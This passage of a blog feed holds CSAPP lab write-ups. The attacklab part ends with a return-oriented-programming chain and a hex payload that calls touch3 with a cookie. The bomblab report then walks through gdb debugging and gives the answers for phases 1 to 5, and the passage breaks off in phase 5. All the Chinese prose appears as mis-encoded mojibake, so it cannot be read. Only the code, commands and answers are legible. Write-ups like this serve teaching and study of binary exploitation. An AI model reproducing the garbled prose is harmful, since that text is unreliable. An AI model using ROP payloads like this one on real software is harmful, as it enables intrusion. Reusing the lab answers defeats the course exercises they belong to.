<code>48 05 00</code>å‘ç°è¿˜æ˜¯æ‰¾ä¸åˆ°ï¼Œä¸€ç­¹è«å±•ä¹‹é™…ï¼Œä½ çªç„¶æƒ³åˆ°ï¼Œå¯ä»¥åˆ©ç”¨å¯„å­˜å™¨çš„ä½ä½ï¼Œä»–ä»¬çš„æ“ä½œç ä¹Ÿæœ‰å¾ˆå¤§åŒºåˆ«çš„ï¼Œæ¯”å¦‚<code>rax</code>çš„ä½32ä½æ˜¯<code>eax</code>ï¼Œä½16ä½æ˜¯<code>ax</code>ï¼Œä½8ä½æ˜¯<code>al</code>ï¼Œæˆ‘ä»¬ä¸€ä¸ªä¸ªæ‰¾è¿‡å»å‘ç°add alæœ‰ä¸€ä¸ªã€‚04 37 è¿™åˆšå¥½æ˜¯al+0x37çš„gadgetã€‚</p><p><img src="https://i.loli.net/2021/04/26/PiXlM34VsBgL1qT.png" alt="attacklab_rtarget_level3_2.png"></p><p>è¿™ä¸ªå¤§å°ä¹Ÿæ˜¯éå¸¸åˆé€‚çš„ï¼Œåœ¨å°½é‡ä¿è¯èƒ½å¤Ÿå…¨è¦†ç›–çš„æƒ…å†µä¸‹ä¿è¯<code>payload</code>è¶Šå°è¶Šå¥½ï¼Œå¤§äº†å®¹æ˜“å‡ºäº‹ã€‚</p><p>é‚£ä¹ˆå¦‚æ­¤æˆ‘ä»¬å°±åªåˆ°æˆ‘ä»¬é‡æ–°å †çš„ä»£ç ç»“æ„äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movq %rsp,%rax</span><br><span class="line">add $0x37,al</span><br><span class="line">movq %rax,%rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">06 1a 40 00 00 00 00 00// movq %rsp,%rax</span><br><span class="line">d8 19 40 00 00 00 00 00// add $0x37,al</span><br><span class="line">c5 19 40 00 00 00 00 00// movq %rax,%rdi</span><br><span class="line">fa 18 40 00 00 00 00 00//touch3</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 35//cookie</span><br><span class="line">39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure><p>ç„¶åå®Œç»“æ’’èŠ±å•¦ï¼ï¼</p><p>ç¬¬ä¸€æ¬¡èƒ½è‡ªå·±å†™å®Œcsappçš„labï¼Œè™½ç„¶éš¾ï¼Œä½†æ˜¯æ”¶è·é¢‡ä¸°ï¼Œè‹¥æœ‰ä¸æ­£ï¼Œæ³è¯·æŒ‡æ­£ï¼ï¼</p>]]></content>
      
      
      <categories>
          
          <category> csapp </category>
          
          <category> lab </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>bomblabå®éªŒæŠ¥å‘Š:äºŒè¿›åˆ¶å®‰å…¨ä¸é€†å‘åˆ†æ</title>
      <link href="/2021/04/19/bomblab/"/>
      <url>/2021/04/19/bomblab/</url>
      
        <content type="html"><![CDATA[<p>å…ˆè§‚å¯Ÿç»™çš„.cæ–‡ä»¶ï¼Œå‘ç°æ˜¯è¦è¾“å…¥å…­ç»„è¯­å¥å¹¶ä¸”åˆ¤æ–­æ­£è¯¯çš„ï¼Œå¹¶ä¸”å¾ˆå®¹æ˜“å‘ç°åˆ¤æ–­å‡½æ•°phase_i(i=1,2â€¦6)è¦æœ‰ä¸€ä¸ªé”™è¯¯ï¼Œç‚¸å¼¹å³çˆ†ç‚¸ï¼Œé‚£æˆ‘ä»¬å°±è¦ç”¨åˆ°gdbè°ƒè¯•äº†,åœ¨ç»ˆç«¯è¾“å…¥<code>gdb bomb</code>è¿›å…¥è°ƒè¯•</p><span id="more"></span><h2 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h2><p>é¦–å…ˆåœ¨phase_1å¤„æ–­ç‚¹ï¼ˆå‘½ä»¤ï¼š<code>b phase_1</code>ï¼‰æ‰¾åˆ°phase_1çš„æ‹†å¼¹è¯­å¥ã€‚ç„¶å<code>r</code>è¿è¡Œï¼Œå…ˆéšä¾¿è¾“å…¥ç‚¹ä¸œè¥¿è¿™é‡Œæˆ‘è¾“å…¥äº†å¾ˆå¤ša,æ–­åœ¨è¯¥å¤„ä¹‹åå•æ­¥è°ƒè¯•ï¼Œå› ä¸ºè¦è¿›å…¥å‡½æ•°å†…éƒ¨ï¼Œæˆ‘ä»¬ç”¨å‘½ä»¤<code>step</code>æˆ–è€…<code>s</code>è¿›è¡Œå•æ­¥è°ƒè¯•ã€‚è°ƒè¯•å‘ç°ä¸€ä¸ª<code>strings_not_equal</code>å‡½æ•°ï¼Œè·Ÿè¿›å»çœ‹å‘ç°å¯„å­˜å™¨<code>rdi</code>ä¸ºæˆ‘ä»¬è¾“å…¥çš„å¾ˆå¤šä¸ªaï¼Œè€Œå¯„å­˜å™¨<code>rsi</code>å·²ç»æœ‰äº†ä¸€å¥è¯ã€‚</p><p><img src="https://i.loli.net/2021/04/25/dVN392JXrMQjDwu.png" alt="bomblab_phase_1_1.png"></p><p>é‚£ä¹ˆèƒ½ç›´æ¥æ–­å®šè¿™ä¸ªå°±æ˜¯æˆ‘ä»¬çš„æ‹†å¼¹è¯­å¥ï¼Œé‡æ–°è°ƒè¯•è¿›å»è¾“å…¥é‚£ä¸ªè¯­å¥<code>Border relations with Canada have never been better.</code>å‘ç°æˆåŠŸæ‹†æ‰äº†è¿™ä¸ªç‚¸å¼¹ï¼Œé‚£ä¹ˆphase_1å°±æ‹†æ‰äº†ã€‚</p><h2 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h2><p>æ‹†å®Œäº†ä¹‹åå°±çœ‹å‘phase_2ï¼Œæˆ‘ä»¬å…ˆ<code>delete</code>    æ¸…é™¤æ‰€æœ‰æ–­ç‚¹ç„¶å<code>b phase_2</code>æ–°å¢æ–­ç‚¹ï¼Œ<code>r</code>ä¹‹åå…ˆè¾“å…¥ä¹‹å‰çš„æ‹†å¼¹è¯­å¥æ¥åˆ°phase_2ï¼Œæˆ‘ä»¬ç…§ä¾‹è¾“å…¥å¾ˆå¤šçš„aï¼Œ<code>s</code>å•æ­¥è°ƒè¯•è¿›å»å‘ç°æœ‰ä¸€ä¸ªå‡½æ•°å«<code>read_six_numbers</code>ï¼Œè·Ÿè¿›å»å‘ç°</p><p><img src="https://i.loli.net/2021/04/25/J7O8Yjl9kKnC1SN.png" alt="bomblab_phase_2_1.png"></p><p>è°ƒç”¨äº†<code>scanf</code>å‡½æ•°å¹¶ä¸”èƒ½çœ‹åˆ°å‚æ•°<code>%d %d %d %d %d %d</code>ï¼Œé‚£æ— ç–‘æˆ‘ä»¬è¿™æ¬¡åº”è¯¥è¾“å…¥å…­ä¸ªæ•´æ•°ã€‚é‚£å°±å…ˆçŒœï¼Œå°±å…ˆè¾“å…¥6ä¸ª0ä¹Ÿç½¢ï¼Œä½†æ­¤æ—¶æˆ‘ä»¬ä¸èƒ½â€™sâ€™å•æ­¥è°ƒè¯•äº†ï¼Œå› ä¸º<code>scanf</code>å†…éƒ¨æ„é€ å¾ˆå¤æ‚ï¼Œ<code>s</code>å•æ­¥è°ƒè¯•ä¼šæŠŠä½ é”®ç›˜æŒ‰çƒ‚çš„ã€‚å› æ­¤æˆ‘ä»¬ç”¨<code>next</code>æˆ–<code>n</code>å•æ­¥è°ƒè¯•ï¼Œè·³è¿‡äº†<code>scanf</code>å‡½æ•°çš„å†…éƒ¨ï¼ŒæˆåŠŸç»™äº†6ä¸ªæ•´æ•°ï¼Œç„¶åç»§ç»­è°ƒè¯•ï¼Œå‘ç°</p><p><img src="https://i.loli.net/2021/04/25/Kil6fnbgrRJH4hm.png" alt="bomblab_phase_2_2.png"></p><p><code>ptr[rsp]=1</code>æ‰èƒ½è·³è½¬é¿å…æ‰§è¡Œåˆ°<code>explode</code>å‡½æ•°ï¼Œæˆ‘ä»¬ç¨å¾®è°ƒè¯•ä¸€ä¸‹ä¹Ÿå¯ä»¥å‘ç°<code>ptr[rsp]</code>å­˜äº†ç¬¬ä¸€ä¸ªè¾“å…¥çš„æ•°å€¼ï¼Œé‚£ä¹ˆå°±å¯ä»¥å¾ˆå®¹æ˜“å¾—åˆ°ç¬¬ä¸€ä¸ªæ•´æ•°æ˜¯<code>1</code>ï¼Œæˆ‘ä»¬æŠŠç¬¬ä¸€ä¸ªå€¼æ”¹æˆ1ï¼Œå…¶å®ƒçš„ç…§å¸¸ä¸å˜ï¼Œå‘ç°ç¬¬ä¸€ä¸ªæ•°èº²è¿‡äº†çˆ†ç‚¸ï¼Œé‚£ä¹ˆè¯´æ˜æˆ‘ä»¬çš„æ–¹æ¡ˆå¯è¡Œï¼Œæ¥ä¸‹æ¥åªéœ€è¦æŠŠå‰©ä¸‹äº”ä¸ªæ•°åˆ¤æ–­å®Œäº†å°±å¯ä»¥äº†ã€‚ç»§ç»­<code>n</code>å•æ­¥è°ƒè¯•ï¼Œå‘ç°ç¬¬äºŒä¸ªæµ‹è¯•çš„æ•°æ˜¯</p><p><img src="https://i.loli.net/2021/04/25/HRzX9CYaBQLN1Sc.png" alt="bomblab_phase_2_3.png"></p><p>ä¸€æ ·çš„æ˜¯æ¯”è¾ƒ<code>eax</code>ä¸Šé¢æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ª</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add eax,eax</span><br></pre></td></tr></table></figure><p>ç„¶åå†æ¯”è¾ƒï¼Œé‚£ä¹ˆç¬¬äºŒä¸ªæ•°ä¸å°±åº”è¯¥æ˜¯2äº†å—ï¼Ÿï¼Œè™½ç„¶æˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆ<code>ptr[rbx]</code>å®ƒå°±æ˜¯ç¬¬äºŒä¸ªæ•°ï¼Œä½†æ˜¯ç¨å¾®æƒ³æƒ³ä¹ŸçŸ¥é“è‚¯å®šæ˜¯ä¾æ¬¡å¯¹ä½ çš„è¾“å…¥å»åˆ¤æ–­çš„ï¼Œæ‰€ä»¥ç¬¬äºŒä¸ªæ•°æ˜¯2äº†ã€‚åŒç†ï¼Œä»–æ¯æ¬¡éƒ½åŠ ä¸Šè‡ªå·±ï¼Œé‚£ä¹ˆæ¯æ¬¡è¾“å…¥çš„æ•°å°±æ˜¯å‰é¢æ•°çš„ä¸¤å€ï¼Œé‚£æ¸…æ™°äº†ï¼Œç­”æ¡ˆåº”è¯¥å°±æ˜¯<code>1 2 4 8 16 32</code>ã€‚æ¸…é™¤æ–­ç‚¹è¾“å…¥åå‘ç°æ²¡æœ‰çˆ†ç‚¸ï¼Œé‚£ä¹ˆphase_2ä¹Ÿæ‹†å¼¹æˆåŠŸäº†ã€‚</p><h2 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h2><p>ç„¶åæ–­ç‚¹ä¸‹åœ¨phase_3ï¼Œæ¥ç€è¿è¡Œåˆ°é‚£è¾¹ã€‚è¿è¡Œåˆ°scanfå‘ç°æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸ºâ€%d %dâ€ï¼Œé‚£å°±æ˜¯ä¸¤ä¸ªæ•´æ•°ï¼Œå¹¶ä¸”çœ‹åˆ°åé¢æœ‰ä¸€ä¸ª<code>cmp eax,1</code>ï¼Œå¹¶ä¸”è¦æ±‚<code>eax&gt;1</code>ï¼Œå¦åˆ™å°±æ‰§è¡Œçˆ†ç‚¸å‡½æ•°äº†ï¼Œ<code>eax</code>åœ¨<code>scanf</code>ä¹‹åè·å¾—äº†<code>scanf</code>å‡½æ•°çš„è¿”å›å€¼ï¼Œscanfçš„è¿”å›å€¼å°±æ˜¯è¾“å…¥æ•°çš„ä¸ªæ•°ã€‚é‚£æˆ‘ä»¬å°±éšä¾¿è¾“å…¥ä¿©æ•°çœ‹çœ‹ã€‚</p><p><img src="https://i.loli.net/2021/04/25/JPg3Rp4u7Tjr6If.png" alt="bomblab_phase_3_1.png"></p><p>ç»§ç»­è°ƒè¯•å‘ç°ï¼Œå¦‚æœ<code>ptr[rsp+8]</code>å¤§äº<code>7</code>ä¼šå‘ç”Ÿè·³è½¬ä¸å¦¨å…ˆè¾“å…¥å¤§äº<code>7</code>çš„å€¼çœ‹çœ‹ä¼šè·³è½¬åˆ°å“ªå„¿ï¼Œè¾“å…¥ä¹‹åï¼Œå¥½çš„ï¼ŒæˆåŠŸçˆ†ç‚¸ï¼Œèº²ä¸æ‰çš„é‚£ç§å“¦ã€‚</p><p><img src="https://i.loli.net/2021/04/25/etqlSa591MrFCVp.png" alt="bomblab_phase_3_2.png"></p><p>é‚£çœ‹æ¥æˆ‘ä»¬ç¬¬ä¸€ä¸ªæ•°åªèƒ½è¾“å…¥<code>0~7</code>ä¹‹å†…çš„å€¼ï¼Œæˆ‘ä»¬å…ˆè¾“å…¥<code>0 0</code>æ¥çœ‹çœ‹ï¼Œç»§ç»­å•æ­¥è°ƒè¯•å‘ç°</p><p><img src="https://i.loli.net/2021/04/25/mz7utwg8CNbLYPU.png" alt="bomblab_phase_3_3.png"></p><p>é‚£è¯´æ˜æˆ‘ä»¬åº”è¯¥è¾“å…¥<code>0 207</code>ï¼Œå› ä¸º<code>eax</code>è¢«èµ‹å€¼äº†<code>0xcf</code>ï¼Œç„¶ååˆæ¯”è¾ƒä¸­ä¹Ÿå«æœ‰<code>eax</code>é‡æ–°æ¥ä¸€éå‘ç°ç«Ÿç„¶è¿‡äº†ï¼Œç›´æ¥èƒ½è¿›å…¥åˆ°phase_4çš„é‚£ç§ï¼Œé‚£ä¹ˆä½ å°±ä¼šæ€è€ƒï¼Œ<code>1~7</code>ä¼šå‘ç”Ÿä»€ä¹ˆï¼Œæ®æµ‹è¯•ï¼Œæ¯ä¸ªæ•°å¯¹åº”äº†ä¸€ä¸ªæ•´æ•°ï¼Œä½ å¯ä»¥ç†è§£ä¸ºæœ‰ä¸€ä¸ªå‡½æ•°<code>f(x)xâˆˆ[0,7]âˆ©Z</code>ç„¶åä½ å¿…é¡»æ­£ç¡®è¾“å…¥<code>x f(x)</code>çš„å…¶ä¸­ä¸€ä¸ªå¯¹åº”ã€‚é‚£ä½ å¯èƒ½è¿˜ä¼šæƒ³ï¼Œè´Ÿæ•°æœ‰æ²¡æœ‰å¯¹åº”ï¼Œå…¶å®æˆ‘ä¹Ÿè¯•è¿‡ï¼Œè´Ÿæ•°ç›´æ¥å°±ä¸è¡Œäº†ï¼Œå› ä¸º<code>jg</code>æŒ‡ä»¤æ˜¯åˆ¤æ–­æ— ç¬¦å·æ•°çš„ï¼Œè´Ÿæ•°å°±ä¼šè¢«çœ‹æˆä¸€ä¸ªå¾ˆå¤§çš„æ­£æ•´æ•°ï¼Œé‚£ä¹ˆä½ è¿˜æ˜¯ä¸å¯é¿å…çš„çˆ†ç‚¸äº†ã€‚</p><h2 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h2><p>åœ¨<code>phase_4</code>å¤„æ–­ç‚¹ï¼Œä¾æ¬¡è¾“å…¥å‰ä¸‰æ¡æ‹†å¼¹è¯­å¥ï¼Œç¬¬å››å¥è€è§„çŸ©è¾“å…¥å¾ˆå¤š<code>a</code>ï¼Œ<code>s</code>å•æ­¥è°ƒè¯•è¿›å…¥<code>scanf</code>ï¼Œå‘ç°è¯­å¥ä¾ç„¶æ˜¯<code>%d %d</code>ï¼Œå¥½å˜›ï¼Œåˆæ˜¯ä¸¤ä¸ªæ•´å‹ï¼Œé‚£é‡æ¥ï¼Œå…ˆ<code>0 0</code>ï¼Œ<code>n</code>å•æ­¥è°ƒè¯•è¿›å»å‘ç°æœ‰ä¸€ä¸ªè¯­å¥<code>cmp eax,2 jne</code>ï¼Œ<code>jne</code>ä¸º<code>jump not equal</code>è¿™ä¸ªåˆ¤æ–­ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯çœ‹<code>scanf</code>æœ‰æ²¡æœ‰è¾“å…¥2ä¸ªæ•°ï¼Œå®ƒéƒ½æ˜¯<code>%d %d</code>äº†ï¼Œè‚¯å®šä½ åªèƒ½è¾“å…¥ä¸¤ä¸ªæ•°å•Šï¼Œä¸æ˜¯ä¸¤ä¸ªå°±çˆ†ç‚¸äº†(<del>Ps:åˆ«é—®æˆ‘ä¸ºä»€ä¹ˆè¿™ä¹ˆè‚¯å®šçš„</del>)ã€‚</p><p><img src="https://i.loli.net/2021/04/25/fTMdxrpsWg1ocXE.png" alt="bomblab_phase_4_1.png"></p><p>è¾“å…¥ä¸¤ä¸ª<code>0</code>å‘ç°è«åå…¶å¦™è¿‡äº†ï¼Œå…¶å®æˆ‘æƒ³å°±è¿™ä¹ˆæ°´è¿‡å»çš„ï¼Œä½†æ˜¯è¿˜å¾—å»åˆ†æçš„ã€‚</p><p><code>disassemble func4</code>æŸ¥çœ‹ä¸€ä¸‹å®ƒé‚£ä¸ªå‡½æ•°çš„æ±‡ç¼–ä»£ç ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function func4:</span><br><span class="line">   0x08048d0b &lt;+0&gt;:    sub    $0x1c,%esp</span><br><span class="line">   0x08048d0e &lt;+3&gt;:    mov    %ebx,0x14(%esp)</span><br><span class="line">   0x08048d12 &lt;+7&gt;:    mov    %esi,0x18(%esp)</span><br><span class="line">   0x08048d16 &lt;+11&gt;:    mov    0x20(%esp),%eax</span><br><span class="line">   0x08048d1a &lt;+15&gt;:    mov    0x24(%esp),%edx</span><br><span class="line">   0x08048d1e &lt;+19&gt;:    mov    0x28(%esp),%esi </span><br><span class="line">   0x08048d22 &lt;+23&gt;:    mov    %esi,%ecx</span><br><span class="line">   0x08048d24 &lt;+25&gt;:    sub    %edx,%ecx       </span><br><span class="line">   0x08048d26 &lt;+27&gt;:    mov    %ecx,%ebx</span><br><span class="line">   0x08048d28 &lt;+29&gt;:    shr    $0x1f,%ebx    </span><br><span class="line">   0x08048d2b &lt;+32&gt;:    add    %ebx,%ecx     </span><br><span class="line">   0x08048d2d &lt;+34&gt;:    sar    %ecx          </span><br><span class="line">   0x08048d2f &lt;+36&gt;:    lea    (%ecx,%edx,1),%ebx    </span><br><span class="line">   0x08048d32 &lt;+39&gt;:    cmp    %eax,%ebx</span><br><span class="line">   0x08048d34 &lt;+41&gt;:    jle    0x8048d4d &lt;func4+66&gt;</span><br><span class="line">   0x08048d36 &lt;+43&gt;:    lea    -0x1(%ebx),%ecx</span><br><span class="line">   0x08048d39 &lt;+46&gt;:    mov    %ecx,0x8(%esp)</span><br><span class="line">   0x08048d3d &lt;+50&gt;:    mov    %edx,0x4(%esp)</span><br><span class="line">   0x08048d41 &lt;+54&gt;:    mov    %eax,(%esp)</span><br><span class="line">   0x08048d44 &lt;+57&gt;:    call   0x8048d0b &lt;func4&gt;</span><br><span class="line">   0x08048d49 &lt;+62&gt;:    add    %eax,%ebx   </span><br><span class="line">   0x08048d4b &lt;+64&gt;:    jmp    0x8048d66 &lt;func4+91&gt;</span><br><span class="line">   0x08048d4d &lt;+66&gt;:    cmp    %eax,%ebx  </span><br><span class="line">   0x08048d4f &lt;+68&gt;:    jge    0x8048d66 &lt;func4+91&gt;</span><br><span class="line">   0x08048d51 &lt;+70&gt;:    mov    %esi,0x8(%esp)</span><br><span class="line">   0x08048d55 &lt;+74&gt;:    lea    0x1(%ebx),%edx </span><br><span class="line">   0x08048d58 &lt;+77&gt;:    mov    %edx,0x4(%esp)</span><br><span class="line">   0x08048d5c &lt;+81&gt;:    mov    %eax,(%esp)</span><br><span class="line">   0x08048d5f &lt;+84&gt;:    call   0x8048d0b &lt;func4&gt;</span><br><span class="line">   0x08048d64 &lt;+89&gt;:    add    %eax,%ebx  </span><br><span class="line">   0x08048d66 &lt;+91&gt;:    mov    %ebx,%eax   </span><br><span class="line">   0x08048d68 &lt;+93&gt;:    mov    0x14(%esp),%ebx</span><br><span class="line">   0x08048d6c &lt;+97&gt;:    mov    0x18(%esp),%esi</span><br><span class="line">   0x08048d70 &lt;+101&gt;:    add    $0x1c,%esp</span><br><span class="line">   0x08048d73 &lt;+104&gt;:    ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°å…ˆæ”¾åœ¨è¿™æˆ‘ä»¬å…ˆçœ‹åé¢æœ‰å“ªäº›æ¡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test   eax, eax</span><br><span class="line">jne    phase_4+76 &lt;phase_4+76&gt; </span><br><span class="line">cmp    dword ptr [rsp + 0xc], 0</span><br><span class="line">je     phase_4+81 &lt;phase_4+81&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¬¡æ˜¯è·³è½¬ä¼šçˆ†ç‚¸ï¼Œç¬¬äºŒæ¬¡æ˜¯ä¸è·³è½¬ä¼šçˆ†ï¼Œé‚£ä¹ˆæ¢è¨€ä¹‹ï¼Œä¸¤æ¬¡éƒ½å¿…é¡»ç­‰äºï¼Œé‚£ä¹ˆç¬¬ä¸€æ¬¡çš„<code>test eax,eax</code>å®ƒå¹²ä»€ä¹ˆäº†å‘¢ï¼Ÿå…ˆæƒ³ä¸€æƒ³å®ƒæ€ä¹ˆåˆ¤æ–­ä¸¤ä¸ªæ•°ç›¸ç­‰ï¼Œä¸¤ä¸ªæ•°ç›¸ç­‰å½“ä¸”ä»…å½“å®ƒä»¬ä¹‹å·®ä¸º0æ—¶æˆç«‹ï¼Œå­—ç¬¦ä¸²ä¹ŸåŒç†ã€‚é‚£ä¹ˆæ¢è¨€ä¹‹ï¼Œå®ƒå°±åˆ¤æ–­<code>eax</code>çš„å€¼æ˜¯ä¸æ˜¯<code>0</code>è€Œå·²ç›¸ç­‰ä¸º<code>0</code>ï¼Œä¸ç›¸ç­‰åˆ™ä¸ä¸º<code>0</code>ã€‚é‚£ä¹ˆå¾ˆæ¸…æ¥šäº†ï¼Œé˜²æ­¢å®ƒè·³è½¬ï¼Œæˆ‘ä»¬è¦ä¿è¯<code>eax</code>å¯„å­˜å™¨å€¼ä¸º0ã€‚ä¸‹é¢å°±æ˜¯åˆ¤æ–­ç¬¬äºŒä¸ªè¾“å…¥çš„å€¼æ˜¯å¦ä¸º0äº†ï¼Œä¸º0è·³è½¬ã€‚</p><p><img src="https://i.loli.net/2021/04/25/usg2zr6lbFYjwhE.png" alt="bomblab_phase_4_2.png"></p><p>å®é™…ä¸Šï¼Œè¿™é‡Œçš„<code>ptr[rsp+0xc]</code>å°±æ˜¯æˆ‘ä»¬è¾“å…¥ç¬¬äºŒä¸ªæ•°çš„ä½å…«ä½ã€‚å› æ­¤ç¬¬äºŒä¸ªæ•°åªèƒ½è¾“å…¥<code>0</code>å› ä¸ºç¬¬ä¸€æ¬¡æ¯”è¾ƒç”¨åˆ°äº†å¯„å­˜å™¨æ¯”è¾ƒï¼Œæˆ‘ä»¬ä¹Ÿä¸çŸ¥é“è¿è¡Œè¿™ä¸ªå‡½æ•°ä¹‹åå‡½æ•°çš„è¿”å›å€¼æ˜¯å¤šå°‘(<code>rax</code>ä¿å­˜å‡½æ•°è¿”å›å€¼)ï¼Œåªèƒ½å»è°ƒè¯•çœ‹çœ‹ã€‚å› æ­¤è¿™ä¸ªç­”æ¡ˆæ˜¯<code>0 0</code></p><h2 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h2><p>ä¾ç„¶å…ˆæ–­ç‚¹ï¼Œè¾“å…¥ä¹‹å‰å››å¥æ‹†å¼¹è¯­å¥ã€‚åˆ°è¿™é‡Œä¹‹åéšä¾¿è¾“å…¥ç‚¹ä¸œè¥¿ï¼Œå‘ç°äº†</p><p><img src="https://i.loli.net/2021/04/25/sQSBH3YFexy6dNJ.png" alt="bomblab_phase_5_1.png"></p><p>è¿™å›æ˜¯è¦è¾“å…¥ä¸€ä¸²å­—ç¬¦ä¸²ï¼Œè€Œä¸”è¿˜æœ‰é•¿åº¦æ£€æµ‹ï¼Œä¸ç­‰äº6ç›´æ¥çˆ†ç‚¸qwqã€‚</p><p>é‚£æˆ‘ä»¬å…ˆéšä¾¿è¾“å…¥ä¸€ä¸ª<code>aaaaaa</code>çœ‹çœ‹æƒ…å†µ</p><p><img src="https://i.loli.net/2021/04/25/JaWfPYRIysXc9qU.png" alt="bomblab_phase_5_2.png"></p><p>å¾ˆæ˜æ˜¾ï¼Œæœ‰ä¸€ä¸ªå¾ªç¯ï¼Œä»¥<code>eax</code>ä¸ºå¾ªç¯å˜é‡ï¼Œä¾æ¬¡å¯¹è¾“å…¥çš„å­—ç¬¦è¿›è¡Œä¸€ç³»åˆ—çš„æ“ä½œã€‚å…·ä½“æ“ä½œæ˜¯ï¼šå…ˆå¯¹å­—ç¬¦<code>and 0xf</code>ç„¶åæŠŠç»“æœä¿å­˜åœ¨<code>rdx</code>é‡Œé¢ï¼Œè¿”å›çš„å­—ç¬¦æ˜¯<code>0x4024b0+rdx</code>,æœ€åè¿™ä¸ªä¿å­˜åˆ°<code>rsp+rax+0x10</code>é‡Œé¢ï¼Œåœ¨å¾€æ ˆåº•åç§»<code>0x10</code>çš„åœ°æ–¹èµ·ä¸€ä¸ªä¿å­˜å¥½çš„å­—ç¬¦ä¸²ã€‚æ¥ä¸‹æ¥åˆè¦æ€ä¹ˆæ“ä½œå‘¢ï¼Ÿæ¥ç€å•æ­¥è°ƒè¯•çœ‹çœ‹ï¼š</p><p><img src="https://i.loli.net/2021/04/25/SiLjU51Z3BroAk9.png" alt="bomblab_phase_5_3.png"></p><p>å‘ç°åœ¨<code>rsp+0x10</code>é‚£ä¸ªä½ç½®çš„å­—ç¬¦ä¸²è¦è¢«<code>&quot;flyers&quot;</code>å­—ç¬¦ä¸²æ¯”è¾ƒï¼Œç›¸ç­‰è·³è½¬ï¼Œä¸è·³è½¬å°±ç‚¸äº†ï¼Œé‚£ä¹ˆå”¯ä¸€æ²¡æœ‰çœ‹çš„å°±æ˜¯åˆšåˆšé‚£ä¸ª<code>0x4024b0+rdx</code>åˆ°åº•æ˜¯ä»€ä¹ˆäº†ã€‚ä½†æ˜¯å¯ä»¥çŒœæµ‹è¿™åº”è¯¥æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œç„¶å<code>rdx</code>åšåç§»å–å­—ç¬¦ä¸²çš„ä¸‹æ ‡å¯¹åº”çš„å­—ç¬¦ã€‚<code>print (char *)0x4024b0</code>æŸ¥çœ‹è¿™ä¸ªå­—ç¬¦ä¸²å‘ç°è¾“å‡ºäº†ä¸€ä¸ªå¾ˆé•¿çš„ä¸œè¥¿<code>maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?</code>å› ä¸ºå¯ä»¥çœ‹åˆ°å®ƒçš„åç§»è¢«<code>and 0xf</code>å¯ä»¥å¾ˆå®¹æ˜“è¯æ˜è¿™ä¸ªåç§»è‚¯å®šå°äºç­‰äº<code>0xf</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å–å‡º16ä½çš„å­—ç¬¦ä¸²<code>maduiersnfotvbyl</code>,<code>flyers</code>çš„è¯ï¼Œå®ƒçš„åç§»å¯ä»¥æ˜¯ï¼š<code>9 15 14 5 6 7</code>è¿™é‡Œå»ºè®®å¤§å®¶å†™è„šæœ¬è·‘ä¸€ä¸‹ï¼Œè‡ªå·±ç¡¬ç®—ä¹Ÿå¯ä»¥çš„ã€‚ä¸ºäº†é˜²æ­¢å­—ç¬¦æ— æ•ˆï¼Œæˆ‘ä»¬å°½é‡å–æ»¡å¯èƒ½ï¼Œå› ä¸ºåç§»æ˜¯å›ºå®šçš„ï¼Œä½†æ˜¯é«˜å››ä½ä¸ç®¡æ˜¯ä»€ä¹ˆéƒ½æ˜¯å¯ä»¥çš„ï¼Œåæ­£æœ€åè¦è¢«<code>and 0xf</code></p><p><img 